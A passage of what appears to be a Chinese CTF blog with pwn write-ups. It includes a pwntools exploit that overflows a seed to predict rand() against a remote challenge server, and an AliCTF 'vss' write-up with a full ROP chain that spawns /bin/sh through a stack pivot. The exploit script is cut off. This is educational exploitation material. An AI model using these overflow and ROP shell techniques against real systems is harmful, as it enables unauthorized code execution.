class="keyword">while</span>(n--)&#123;</span><br><span class="line">        <span class="type">int</span> ok=rand()%<span class="number">6</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, ok);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./b59204f56a0545e8a22f8518e749f19f&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="string">&#x27;41923&#x27;</span>)</span><br><span class="line"></span><br><span class="line">num = [<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>]</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> no <span class="keyword">in</span> num:</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;number:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(no))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>脚本执行便可获得flag： cyberpeace{4e3336a2bfd434405154107ca1240212}</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/image-20200119205400147.png" alt="image-20200119205400147"></p><h4 id="第二种EXP（利用python库）">第二种EXP（利用python库）</h4><p>后来在搜索题解的时候，意识到可以直接使用python标准库中自带的ctypes模块进行python和c的混合编程</p><p>那么我们的exp可以这样写</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process(&#x27;./b59204f56a0545e8a22f8518e749f19f&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>,<span class="string">&#x27;41923&#x27;</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">sh.recvuntil(<span class="string">&quot;number:&quot;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>运行，同样也可以得到flag</p><blockquote><p>参考链接：</p><p><a href="https://blog.csdn.net/lianghui0811/article/details/76480664">rand和srand函数的使用</a></p><p><a href="https://www.cnblogs.com/gaowengang/p/7919219.html">使用 ctypes 进行 Python 和 C 的混合编程</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN刷题记录——2016 AliCTF-vss</title>
      <link href="/posts/e6a1eaac.html"/>
      <url>/posts/e6a1eaac.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>2016 AliCTF : vss [<a href="https://github.com/BayMRX/Blog_source/raw/master/pwn/vss">下载地址</a>]</p></blockquote><h2 id="题目分析-2">题目分析</h2><p>首先检查一下程序保护</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566655772692.png" alt="1566655772692"></p><p>只开启了NX保护，而且程序是64位的</p><p>运行一下</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566655810306.png" alt="1566655810306"></p><p>发现需要密码……直接丢到IDA里面查看，加载用了一段时间，程序有一丢丢大</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566656792830.png" alt="1566656792830"></p><p>打开之后也直接懵逼了，程序不像是我们之前所见到的那样，而是包含了大量的函数，猜测文件可能是静态编译，把所有用到的库函数都放在了一个文件里面进行编译</p><p>在linux里面用<code>file</code>检查，果然是静态链接</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566656957749.png" alt="1566656957749"></p><p>在IDA里面有一个start函数，猜测是程序开始的地方，但是一阵乱点之后也没找到程序执行的内容在哪，想起IDA可以通过字符串查询，<code>Ctrl+T</code>搜索<code>Password:</code></p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566657136574.png" alt="1566657136574"></p><p>终于找到了程序真正开始的地方，可以对一些函数功能进行猜测然后对其命名，方便后边的分析查看。根据程序的流程可以猜测<code>sub_408800</code>是puts函数，<code>sub_437EA0</code>是read函数，在这里最大可以读取1024字节的数据，数据被读入到<code>v1</code>中，可以将其命名为<code>str</code>。str的缓冲区有400h=1024个字节，所以这里并不会产生溢出漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566658368407.png" alt="1566658368407"></p><p>我们进入到<code>sub_40108E</code>继续查看</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566658810310.png" alt="1566658810310"></p><p>看到<code>sub_400330</code>函数的形式比较熟悉，很像字符串拷贝的函数，将str的内容复制到v2中最大长度为80个字节，而在IDA中可以看出v2的最大缓冲只有40h=64个字节，所以此处很可能是程序缓冲区漏洞所在，但是留给我们可以使用的shellcode空间只有80-64=16个字节，远远小于我们可以使用的最小的shellcode空间，对于64位的程序，刚好覆盖到函数ret的返回地址。想到上一个函数拥有1024Bytes的空间，我们可以控制rsp移动将栈转移到上一个函数的空间中。</p><h2 id="代码利用">代码利用</h2><h3 id="1-控制rsp">1. 控制rsp</h3><p>因为父函数的栈空间在子函数栈空间的上方，所以要想将栈转移到父函数空间中，需要将rsp指针上移</p><p>找一下<code>add rsp</code>的gadget</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566830818973.png" alt="1566830818973"></p><p>由于子函数的可写入数据为80个字节大小，所以我们要将rsp增加80以上，符合条件的我们可以使用<code>0x000000000046f205 : add rsp, 0x58 ; ret</code>这一个gadget</p><h3 id="2-寻找shellcode">2. 寻找shellcode</h3><p>构造shellcode可以使用ROPgadget的ropchain功能</p><p>输入<code>ROPgadget --binary vss --ropchain</code>就可以自动生成一个可以使用的ropchain</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line">ROP chain generation</span><br><span class="line">===========================================================</span><br><span class="line"></span><br><span class="line">- Step <span class="number">1</span> -- Write-what-where gadgets</span><br><span class="line"></span><br><span class="line">[+] Gadget found: <span class="number">0x46b8d1</span> mov qword ptr [rsi], rax ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x401937</span> pop rsi ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x46f208</span> pop rax ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x41bd1f</span> xor rax, rax ; ret</span><br><span class="line"></span><br><span class="line">- Step <span class="number">2</span> -- Init syscall number gadgets</span><br><span class="line"></span><br><span class="line">[+] Gadget found: <span class="number">0x41bd1f</span> xor rax, rax ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x45e790</span> add rax, <span class="number">1</span> ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x45e791</span> add eax, <span class="number">1</span> ; ret</span><br><span class="line"></span><br><span class="line">- Step <span class="number">3</span> -- Init syscall arguments gadgets</span><br><span class="line"></span><br><span class="line">[+] Gadget found: <span class="number">0x401823</span> pop rdi ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x401937</span> pop rsi ; ret</span><br><span class="line">[+] Gadget found: <span class="number">0x43ae05</span> pop rdx ; ret</span><br><span class="line"></span><br><span class="line">- Step <span class="number">4</span> -- Syscall gadget</span><br><span class="line"></span><br><span class="line">[+] Gadget found: <span class="number">0x4004b8</span> syscall</span><br><span class="line"></span><br><span class="line">- Step <span class="number">5</span> -- Build the ROP chain</span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># execve generated by ROPgadget</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401937</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000006c4080</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046f208</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046b8d1</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401937</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000006c4088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041bd1f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046b8d1</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401823</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000006c4080</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401937</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000006c4088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000043ae05</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000006c4088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041bd1f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000045e790</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000004004b8</span>) <span class="comment"># syscall</span></span><br></pre></td></tr></table></figure><p>生成的ropchain有点长，但也完全适合我们的题目要求</p><h3 id="3-编写exp">3. 编写exp</h3><p>再次观察子函数的源代码</p><p><img src="https://cdn.jsdelivr.net/gh/BayMRX/Blog_source@master/img/1566831279543.png" alt="1566831279543"></p><p>可以发现，如果前两个字符为‘py’可以直接使程序返回而不用执行下面一堆乱七八糟的东西，所以我们可以只关注这一小段代码，从<code>int v2; // [rsp+10h] [rbp-40h]</code>可以推断出，需要填充的无用数据为0x40+8=0x48个字节，由于最开始两个字节已经固定为‘py’，所以我们还需要填充0x46个字节。接着就是我们找到的<code>add rsp</code>的地址，再往上就是我们主函数的栈空间。由于子函数我们使用的栈空间的80个字节是从主函数栈空间的前80个字节拷贝过来的，所以主函数的栈空间中，前80个字节已经固定了，要想ret到我们的shellcode，还需要再填充0x58-80=8个字节</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line">sh = process(<span class="string">&#x27;./vss&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401937</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000006c4080</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046f208</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046b8d1</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401937</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000006c4088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000041bd1f</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x000000000046b8d1</span>) <span class="comment"># mov qword ptr [rsi], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401823</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000006c4080</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401937</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x00000000006c4088</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span 